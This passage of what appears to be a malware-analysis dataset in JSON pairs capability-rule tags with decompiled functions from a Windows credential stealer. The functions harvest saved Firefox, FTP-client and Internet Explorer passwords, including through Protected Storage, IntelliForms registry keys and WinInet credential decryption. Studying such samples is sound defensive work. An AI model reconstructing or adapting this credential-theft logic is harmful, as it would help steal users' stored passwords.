        "decompiled_code": "\nvoid __cdecl fcn.004094d8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *arg_8h_00;\n    int32_t arg_8h_01;\n    uint uVar3;\n    int32_t iVar4;\n    char *arg_ch_00;\n    uint arg_8h_02;\n    uint arg_8h_03;\n    uint uVar5;\n    char *pcVar6;\n    char *arg_8h_04;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    char *var_24h;\n    uint var_20h;\n    char *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401f36(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.0040413f(arg_ch);\n    if (iVar2 != 0) {\n        return;\n    }\n    fcn.00409061(arg_10h, arg_14h);\n    iVar2 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar2 != 0) {\n        arg_8h_00 = fcn.004025e7(var_8h, var_4h);\n        if (arg_8h_00 != NULL) {\n            if (*arg_8h_00 != '\\0') {\n                arg_8h_01 = fcn.0040949c(arg_8h_00);\n                uVar3 = fcn.004106ee(0x4160a5, arg_8h_01);\n                iVar8 = arg_8h_01;\n                uVar3 = fcn.004106ee(0x4160a9, arg_8h_01, uVar3);\n                iVar7 = 0x4160ad;\n                iVar2 = arg_8h_01;\n                iVar4 = fcn.004106ee(0x4160ad, arg_8h_01, uVar3);\n                if (((iVar4 == 0) || (iVar7 == 0)) || (iVar2 == 0)) {\n                    iVar4 = -1;\n                    pcVar6 = arg_8h_00;\n                    do {\n                        arg_8h_04 = pcVar6;\n                        if (iVar4 == 0) break;\n                        iVar4 = iVar4 + -1;\n                        arg_8h_04 = pcVar6 + 1;\n                        cVar1 = *pcVar6;\n                        pcVar6 = arg_8h_04;\n                    } while (cVar1 != '\\0');\n                    var_18h = 0;\n                    do {\n                        if (*arg_8h_04 == '\\0') break;\n                        uVar3 = fcn.0040949c(arg_8h_04);\n                        if (var_18h == 0) {\n                            iVar4 = fcn.004106ee();\n                            if (iVar4 == 0) {\n                                var_18h = 1;\n                            }\n                        }\n                        else {\n                            if (var_18h == 1) {\n                                var_18h = 2;\n                                var_1ch = arg_8h_04;\n                            }\n                            else if (var_18h == 2) {\n                                var_18h = 3;\n                            }\n                            else if (var_18h == 3) {\n                                var_18h = 4;\n                                var_24h = arg_8h_04;\n                            }\n                            else if (var_18h == 4) {\n                                var_18h = 5;\n                            }\n                            else if (var_18h == 5) {\n                                if (iVar2 == 0) {\n                                    var_18h = 2;\n                                }\n                                else {\n                                    var_18h = 6;\n                                }\n                                var_44h = 0;\n                                var_48h = 0;\n                                arg_ch_00 = fcn.0040949c(var_1ch);\n                                arg_8h_02 = fcn.0040949c(var_24h);\n                                pcVar6 = arg_8h_04;\n                                arg_8h_03 = fcn.0040949c(arg_8h_04);\n                                if (*0x416030 == 0) {\n                                    fcn.0041066a(0x416126);\n                                    pcVar6 = arg_ch_00;\n                                    iVar4 = fcn.00410820();\n                                    if (iVar4 != 0) {\n                                        fcn.0041066a(\"http://\");\n                                        pcVar6 = arg_ch_00;\n                                        iVar4 = fcn.00410820();\n                                    }\n                                    if (iVar4 != 0) {\n                                        pcVar9 = \"https://\";\n                                        uVar5 = fcn.0041066a(\"https://\", pcVar6);\n                                        pcVar6 = arg_ch_00;\n                                        iVar4 = fcn.00410820(iVar8, \"https://\", uVar5, pcVar9, arg_ch_00);\n                                    }\n                                }\n                                else if (*0x416030 == 1) {\n                                    fcn.0041066a(\"ftp.\");\n                                    pcVar6 = arg_ch_00;\n                                    iVar4 = fcn.00410820();\n                                }\n                                else {\n                                    iVar4 = 0;\n                                }\n                                if (iVar4 == 0) {\n                                    uVar5 = fcn.0041066a(arg_8h_02, pcVar6);\n                                    var_44h = fcn.00409142(arg_8h_02, uVar5);\n                                    uVar5 = fcn.0041066a(arg_8h_03);\n                                    var_48h = fcn.00409142(arg_8h_03, uVar5);\n                                    if ((arg_ch_00 != NULL) && (var_48h != 0)) {\n                                        fcn.00401569(arg_8h, 0xbeef0000);\n                                        fcn.004015cb(arg_8h, arg_ch_00);\n                                        fcn.004015cb(arg_8h, var_44h);\n                                        fcn.004015cb(arg_8h, var_48h);\n                                    }\n                                }\n                                fcn.004018b8(arg_ch_00);\n                                fcn.004018b8(arg_8h_02);\n                                fcn.004018b8(arg_8h_03);\n                                fcn.004018b8(var_44h);\n                                fcn.004018b8(var_48h);\n                                iVar8 = var_44h;\n                            }\n                            else if (var_18h == 6) {\n                                var_18h = 2;\n                            }\n                            if (var_18h != 0) {\n                                iVar4 = fcn.004106ee(uVar3, 0x414f84);\n                                if (iVar4 == 0) {\n                                    var_18h = 1;\n                                }\n                                iVar4 = fcn.004106ee();\n                                if (iVar4 == 0) {\n                                    var_18h = 2;\n                                }\n                            }\n                        }\n                        fcn.004018b8(uVar3);\n                        iVar4 = -1;\n                        pcVar6 = arg_8h_04;\n                        do {\n                            arg_8h_04 = pcVar6;\n                            if (iVar4 == 0) break;\n                            iVar4 = iVar4 + -1;\n                            arg_8h_04 = pcVar6 + 1;\n                            cVar1 = *pcVar6;\n                            pcVar6 = arg_8h_04;\n                        } while (cVar1 != '\\0');\n                    } while (*arg_8h_04 != '\\0');\n                }\n                fcn.004018b8(arg_8h_01);\n            }\n            fcn.004018b8(arg_8h_00);\n        }\n        fcn.00402091(&var_10h);\n    }\n    fcn.00409119();\n    return;\n}\n",
        "token_count": 1878
    },
    "00409832": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_13eh\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00409832(uchar *arg_8h, uint arg_ch, uint arg_10h, char *arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uchar *puVar5;\n    char *pcVar6;\n    uchar *arg_8h_00;\n    uint var_14ch;\n    char *var_148h;\n    uint var_144h;\n    uint var_13eh;\n    int16_t iStack280;\n    uchar auStack278 [274];\n    \n    var_148h = NULL;\n    if ((arg_14h != NULL) && (*arg_14h != '\\0')) {\n        iVar1 = fcn.004025a9(arg_14h);\n        if (iVar1 == 0) {\n            var_148h = fcn.00401df8(arg_14h, \"\\\\*.*\");\n        }\n        else {\n            var_148h = fcn.00401df8(arg_14h, 0x414f8e);\n        }\n        fcn.004018e6(&fcn.00409832::var_13eh, 0x13e);\n        iVar1 = fcn.0041070c(var_148h, &fcn.00409832::var_13eh);\n        if (iVar1 != -1) {\n            do {\n                if ((var_13eh & 0x10) == 0) {\n                    if (*0x416030 == 3) {\n                        arg_8h_00 = &stack0xfffffeea;\n                        iVar2 = fcn.00410808();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401df8(arg_14h, 0x414845);\n                            uVar3 = fcn.00401e4c(uVar3, &stack0xfffffeea);\n                            arg_8h_00 = arg_8h;\n                            fcn.0040406c(arg_8h, uVar3, 0xbeef0001);\n                            fcn.004018b8(arg_8h_00);\n                        }\n                    }\n                    else {\n                        var_13eh._0_2_ = &stack0xfffffeea >> 0x10;\n                        iVar2 = fcn.00410808();\n                        if (iVar2 != 0) {\n                            uVar3 = fcn.00401df8(arg_14h, 0x414845);\n                            uVar3 = fcn.00401e4c(uVar3, &stack0xfffffeea);\n                            var_13eh._0_2_ = arg_8h >> 0x10;\n                            fcn.0040926b(arg_8h, uVar3, arg_ch, arg_10h);\n                            fcn.004018b8(arg_8h & 0xffff | var_13eh << 0x10);\n                        }\n                        var_148h = 0x4099ee;\n                        uVar4 = fcn.0041066a();\n                        if ((uVar4 < 2) || (*(&stack0xfffffee8 + uVar4) != 0x732e)) {\n                            var_148h = \"signons.txt\";\n                            uVar3 = fcn.00410808();\n                            arg_8h_00 = fcn.00410808(&stack0xfffffeea, \"signons2.txt\", uVar3);\n                            pcVar6 = \"signons3.txt\";\n                            puVar5 = &stack0xfffffeea;\n                            iVar2 = fcn.00410808(&stack0xfffffeea, \"signons3.txt\", arg_8h_00);\n                            if ((iVar2 == 0) && ((puVar5 == NULL && (pcVar6 == NULL)))) goto code_r0x00409a75;\n                        }\n                        uVar3 = fcn.00401df8(arg_14h, 0x414845);\n                        uVar3 = fcn.00401e4c(uVar3, &stack0xfffffeea);\n                        arg_8h_00 = arg_8h;\n                        fcn.004094d8(arg_8h, uVar3, arg_ch, arg_10h);\n                        fcn.004018b8(arg_8h_00);\n                    }\n                }\n                else {\n                    arg_8h_00 = 0x414f84;\n                    iVar2 = fcn.00410712();\n                    if (iVar2 != 0) {\n                        arg_8h_00 = 0x414f86;\n                        iVar2 = fcn.00410712();\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.004025a9(arg_14h);\n                            if (iVar2 == 0) {\n                                uVar3 = fcn.00401df8(arg_14h, 0x414845);\n                            }\n                            else {\n                                uVar3 = fcn.00401df8(arg_14h, 0);\n                            }\n                            uVar3 = fcn.00401e4c(uVar3, &stack0xfffffeea);\n                            arg_8h_00 = arg_8h;\n                            fcn.00409832(arg_8h, arg_ch, arg_10h, uVar3);\n                            fcn.004018b8(arg_8h_00);\n                        }\n                    }\n                }\ncode_r0x00409a75:\n                iVar2 = fcn.00410718(iVar1, &fcn.00409832::var_13eh, arg_8h_00);\n            } while (iVar2 != 0);\n            fcn.0041071e(iVar1);\n        }\n    }\n    fcn.004018b8(var_148h);\n    return;\n}\n",
        "token_count": 1297
    },
    "00409ac1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409ac1(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint arg_8h_01;\n    char *arg_8h_02;\n    uint arg_ch_00;\n    uint32_t uVar3;\n    char *arg_ch_01;\n    char *pcVar4;\n    char *pcVar5;\n    uint arg_8h_03;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401f7e(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.00401f7e(arg_10h);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.004025a9(arg_ch);\n    if (iVar2 == 0) {\n        arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n    }\n    else {\n        arg_8h_00 = fcn.00401df8(arg_ch, 0);\n    }\n    arg_8h_01 = fcn.00401df8(arg_8h_00, \"profiles.ini\");\n    arg_8h_02 = fcn.004018cf(0xfdea);\n    arg_ch_00 = fcn.004018cf(0x1000);\n    iVar2 = fcn.00401f36(arg_8h_01);\n    if ((iVar2 != 0) && (uVar3 = fcn.0041074e(arg_8h_02, 65000, arg_8h_01),  2 < uVar3)) {\n        cVar1 = *arg_8h_02;\n        pcVar5 = arg_8h_02;\n        while (cVar1 != '\\0') {\n            iVar2 = fcn.00410808();\n            if ((iVar2 != 0) && (iVar2 = fcn.00410742(),  iVar2 != 0)) {\n                iVar2 = fcn.00410754(pcVar5, \"IsRelative\", 1, arg_8h_01);\n                if (iVar2 == 1) {\n                    arg_ch_01 = fcn.00401df8(arg_8h_00, arg_ch_00);\n                    for (pcVar4 = arg_ch_01; (pcVar4 != NULL && (*pcVar4 != '\\0')); pcVar4 = pcVar4 + 1) {\n                        if (*pcVar4 == '/') {\n                            *pcVar4 = '\\\\';\n                        }\n                    }\n                    arg_8h_03 = arg_8h;\n                    fcn.00409aa9(arg_8h, arg_ch_01, arg_10h);\n                    fcn.004018b8(arg_8h_03);\n                }\n                else {\n                    fcn.00409aa9(arg_8h, arg_ch_00, arg_10h);\n                }\n            }\n            iVar2 = -1;\n            pcVar4 = pcVar5;\n            do {\n                pcVar5 = pcVar4;\n                if (iVar2 == 0) break;\n                iVar2 = iVar2 + -1;\n                pcVar5 = pcVar4 + 1;\n                cVar1 = *pcVar4;\n                pcVar4 = pcVar5;\n            } while (cVar1 != '\\0');\n            cVar1 = *pcVar5;\n        }\n    }\n    fcn.004018b8(arg_8h_00);\n    fcn.004018b8(arg_ch_00);\n    fcn.004018b8(arg_8h_01);\n    fcn.004018b8(arg_8h_02);\n    fcn.00409aa9(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 880
    },
    "0040a0a2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a0a2(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint uVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x2a, 0);\n    iVar2 = fcn.00401eb1(0);\n    if (iVar2 != 0) {\n        uVar5 = arg_8h;\n        fcn.00404351(arg_8h, iVar2, \"SiteInfo.QFP\", 0xbeef0000);\n        fcn.004018b8(uVar5);\n    }\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            uVar5 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"SiteInfo.QFP\", 0xbeef0000);\n            fcn.004018b8(uVar5);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 514
    },
    "0040a144": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a144(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar3;\n    char *pcVar4;\n    uint arg_8h_01;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x2b, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040242b(arg_8h_00);\n            arg_8h_01 = arg_8h;\n            fcn.00404351(arg_8h, arg_ch_00, \"Favorites.dat\", 0xbeef0000);\n            fcn.004018b8(arg_8h_01);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 443
    },
    "0040a342": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a342(uint arg_8h, uint arg_ch, uint arg_10h, int32_t *arg_14h, code *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    \n    if (arg_18h != NULL) {\n        iVar1 = (**(*arg_14h + 0x54))(arg_14h, 0, arg_8h, arg_ch, 0, &var_48h);\n        if (iVar1 == 0) {\n            while( true ) {\n                var_44h = 0;\n                (**(*var_48h + 0xc))(var_48h, 0x10, &var_40h, &var_44h);\n                if (var_44h == 0) break;\n                puVar2 = &var_40h;\n                do {\n                    (*arg_18h)(arg_8h, arg_ch, *puVar2, arg_10h, arg_14h);\n                    fcn.0041079c(*puVar2);\n                    puVar2 = puVar2 + 1;\n                    var_44h = var_44h + -1;\n                } while (var_44h != 0);\n            }\n            (**(*var_48h + 8))(var_48h);\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "0040a3c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a3c8(uint arg_8h, uint arg_ch, int32_t *arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint *arg_ch_00;\n    int32_t *var_108h;\n    int32_t var_104h;\n    uint var_100h;\n    \n    iVar1 = (**(*arg_10h + 0x3c))(arg_10h, 0, arg_8h, 0, &var_108h);\n    if (iVar1 == 0) {\n        while( true ) {\n            var_104h = 0;\n            (**(*var_108h + 0xc))(var_108h, 0x10, &var_100h, &var_104h);\n            if (var_104h == 0) break;\n            arg_ch_00 = &var_100h;\n            do {\n                fcn.0040a342(arg_8h, arg_ch_00, arg_ch, arg_10h, arg_14h);\n                arg_ch_00 = arg_ch_00 + 4;\n                var_104h = var_104h + -1;\n            } while (var_104h != 0);\n        }\n        (**(*var_108h + 8))(var_108h);\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0040a45e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a45e(uint arg_8h, int32_t *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint *arg_8h_00;\n    int32_t *var_108h;\n    uint var_104h;\n    int32_t var_4h;\n    \n    iVar1 = (**(*arg_ch + 0x38))(arg_ch, 0, 0, &var_108h);\n    if (iVar1 == 0) {\n        while( true ) {\n            var_4h = 0;\n            (**(*var_108h + 0xc))(var_108h, 0x10, &var_104h, &var_4h);\n            if (var_4h == 0) break;\n            arg_8h_00 = &var_104h;\n            do {\n                fcn.0040a3c8(arg_8h_00, arg_8h, arg_ch, arg_10h);\n                arg_8h_00 = arg_8h_00 + 4;\n                var_4h = var_4h + -1;\n            } while (var_4h != 0);\n        }\n        (**(*var_108h + 8))(var_108h);\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "0040a557": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a557(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *var_82ch;\n    uint var_828h;\n    uint *var_824h;\n    int32_t var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_808h;\n    uint var_804h;\n    uint var_800h;\n    uint var_400h;\n    \n    fcn.0040a2a9(arg_8h, &var_400h, arg_18h);\n    fcn.004106e2(0, 0, arg_10h, 0xffffffff, &var_800h, 0x3ff, 0, 0);\n    var_810h = 0x10;\n    var_80ch = 2;\n    var_808h = 0;\n    var_804h = 0;\n    (**(*arg_18h + 0x44))(arg_18h, 0, arg_8h, arg_ch, arg_10h, &var_818h, &var_814h, &var_810h, 0);\n    if (var_818h == 0) {\n        return;\n    }\n    if (var_814h == 0) {\n        return;\n    }\n    var_82ch = 0xbeef0000;\n    iVar1 = fcn.00410712(&var_400h, \"Internet Explorer\");\n    if (iVar1 != 0) {\n        var_82ch = 0xbeef0001;\n        iVar1 = fcn.00410712(&var_400h, \"WininetCacheCredentials\");\n        if (iVar1 != 0) {\n            var_82ch = 0xbeef0002;\n            puVar2 = &var_400h;\n            iVar1 = fcn.00410712(puVar2, \"MS IE FTP Passwords\");\n            if (iVar1 != 0) goto code_r0x0040a703;\n        }\n    }\n    puVar2 = &var_800h;\n    iVar1 = fcn.00410808();\n    if (iVar1 == 0) {\n        fcn.0040a4e9(var_82ch, arg_10h, var_814h, var_818h, arg_14h);\n        puVar2 = var_82ch;\n    }\n    else if (*0x414b43 != NULL) {\n        var_820h = var_818h;\n        var_81ch = var_814h;\n        iVar1 = (**0x414b43)(&var_820h, 0, 0, 0, 0, 1, &var_828h);\n        if (iVar1 != 0) {\n            fcn.0040a4e9(var_82ch, arg_10h, var_824h, var_828h, arg_14h);\n            fcn.0041067c();\n            puVar2 = var_824h;\n        }\n    }\ncode_r0x0040a703:\n    fcn.0041079c(var_814h, puVar2);\n    return;\n}\n",
        "token_count": 760
    },
    "0040a712": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a712(uint arg_8h, uint arg_ch, ushort *arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t var_50h;\n    uint var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint32_t var_2ch;\n    uint var_28h;\n    uint var_14h;\n    \n    iVar1 = fcn.00410760(arg_ch);\n    if (iVar1 == 0) {\n        return;\n    }\n    fcn.00403510(arg_ch, iVar1 * 2 + 2, &var_14h);\n    var_2ch = 0;\n    for (uVar2 = 0; uVar2 < 0x14; uVar2 = uVar2 + 1) {\n        var_2ch = var_2ch + *(&var_14h + uVar2);\n    }\n    var_30h = 0;\n    for (uVar2 = 0; uVar2 < 0x14; uVar2 = uVar2 + 1) {\n        fcn.004107ae(&var_28h, 0x4162f3, *(&var_14h + uVar2));\n        var_30h = fcn.00401e4c(var_30h, &var_28h);\n    }\n    var_2ch = var_2ch & 0xff;\n    fcn.004107ae(&var_28h, 0x4162f3, var_2ch);\n    var_30h = fcn.00401e4c(var_30h, &var_28h);\n    iVar1 = fcn.00401d71(*0x414869, \"Software\\\\Microsoft\\\\Internet Explorer\\\\IntelliForms\\\\Storage2\", var_30h, &var_34h)\n    ;\n    if (iVar1 != 0) {\n        var_38h = iVar1;\n        if (var_34h != 0) {\n            iVar1 = fcn.00410760(arg_ch);\n            var_50h = iVar1 * 2 + 2;\n            var_4ch = arg_ch;\n            var_40h = var_34h;\n            var_3ch = var_38h;\n            var_44h = 0;\n            if (*0x414b43 != NULL) {\n                iVar1 = (**0x414b43)(&var_40h, 0, &var_50h, 0, 0, 1, &var_48h);\n                if ((iVar1 != 0) && (var_44h != 0)) {\n                    if (arg_10h != NULL) {\n                        *arg_10h = 0x3f;\n                    }\n                    fcn.0040a4e9(0xbeef0003, arg_ch, var_44h, var_48h, arg_8h);\n                    fcn.0041067c();\n                }\n            }\n        }\n        fcn.004018b8(var_38h);\n    }\n    fcn.004018b8(var_30h);\n    return;\n}\n",
        "token_count": 750
    },
    "0040a875": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a875(uint arg_8h)\n\n{\n    int32_t iVar1;\n    ushort *var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar1 = fcn.004107a2(str._J7_, 0, 5, str.AJ7_, &var_4h);\n    if (-1 < iVar1) {\n        iVar1 = (**(*var_4h + 0x1c))(var_4h, &var_8h);\n        if ((-1 < iVar1) && (var_8h != NULL)) {\n            var_2ch = 0;\n            var_28h = 0;\n            var_30h = 0x28;\n            while( true ) {\n                var_34h = 0;\n                iVar1 = (**(*var_8h + 0xc))(var_8h, 1, &var_30h, &var_34h);\n                if ((iVar1 != 0) || (var_34h != 1)) break;\n                if (var_2ch != 0) {\n                    var_38h = fcn.00410826(var_2ch, 0x4162ef);\n                    if (var_38h == NULL) {\n                        var_38h = NULL;\n                    }\n                    else {\n                        *var_38h = 0;\n                    }\n                    fcn.0040a712(arg_8h, var_2ch, var_38h);\n                    fcn.0041079c();\n                    if (var_28h != 0) {\n                        fcn.0041079c();\n                    }\n                }\n            }\n            (**(*var_8h + 8))(var_8h);\n        }\n        (**(*var_4h + 8))(var_4h);\n    }\n    fcn.0040a712(arg_8h, L\"http://www.facebook.com/\", 0);\n    return;\n}\n",
        "token_count": 471
    },
    "0040a96d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a96d(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char16_t *pcVar3;\n    int32_t *piVar4;\n    int32_t var_20h;\n    char16_t *var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    if (*0x416365 == 0) {\n        *0x416365 = 1;\n        for (pcVar3 = L\"abe2869f-9b47-4cd9-a358-c22904dba7f7\"; *pcVar3 != L'\\0'; pcVar3 = pcVar3 + 1) {\n            *pcVar3 = *pcVar3 << 2;\n        }\n    }\n    if (((*0x414b0f != NULL) && (*0x414b0b != NULL)) && (*0x414b43 != NULL)) {\n        var_4h = NULL;\n        var_8h = 0;\n        iVar1 = (**0x414b0b)(\"Microsoft_WinInet_*\", 0, &var_8h, &var_4h);\n        if (((iVar1 != 0) && (var_8h != 0)) && (piVar4 = var_4h,  var_4h != NULL)) {\n            for (; (var_8h != 0 && (*piVar4 != 0)); piVar4 = piVar4 + 1) {\n                iVar1 = *piVar4;\n                var_10h = *(iVar1 + 0x18);\n                var_ch = *(iVar1 + 0x1c);\n                iVar2 = fcn.00410760(L\"abe2869f-9b47-4cd9-a358-c22904dba7f7\");\n                var_20h = iVar2 * 2 + 2;\n                var_1ch = L\"abe2869f-9b47-4cd9-a358-c22904dba7f7\";\n                var_14h = NULL;\n                iVar2 = (**0x414b43)(&var_10h, 0, &var_20h, 0, 0, 1, &var_18h);\n                if ((iVar2 != 0) && (var_14h != NULL)) {\n                    fcn.0040a522(0xbeef0004, *(iVar1 + 8), var_14h, var_18h, arg_8h);\n                    piVar4 = var_14h;\n                    fcn.0041067c();\n                }\n                var_8h = var_8h + -1;\n            }\n            (**0x414b0f)(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 649
    },
    "0040aaa8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
